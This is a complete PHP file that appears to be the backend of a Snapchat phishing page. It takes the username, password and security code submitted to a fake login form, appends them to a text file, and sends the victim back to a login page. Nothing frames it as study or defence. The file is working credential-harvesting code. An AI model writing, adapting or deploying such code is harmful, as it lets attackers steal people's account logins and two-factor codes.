<?php

file_put_contents("usernames.txt", "Snapchat Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . " Security Code: " . $_POST['security_code'] . "\n", FILE_APPEND);
# header('Location: https://web.snapchat.com'); 
header('Location: login.html'); 
exit();
?>